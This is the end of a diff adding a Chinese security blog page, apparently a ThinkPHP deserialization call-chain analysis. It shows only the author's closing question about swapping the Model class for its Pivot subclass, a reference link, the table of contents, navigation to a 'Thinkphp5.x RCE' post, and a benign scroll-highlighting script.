+<p>其实我是比较疑惑的就是在构造exp的时候，Model类为什么要换成他的子类Pivot呢，因为上面的exp是直接拿的别的师傅的，希望有知道的师傅能帮忙解答一下</p>
+<h1 id="参考">参考</h1>
+<p>https://xz.aliyun.com/t/10364#toc-1</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">调用链分析</a></li>
+<li><a href="#%E7%96%91%E6%83%91%E7%82%B9">疑惑点</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/thinkphp5x-rce/">
+              <h3 class="post-title">
+                Thinkphp5.x RCE
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
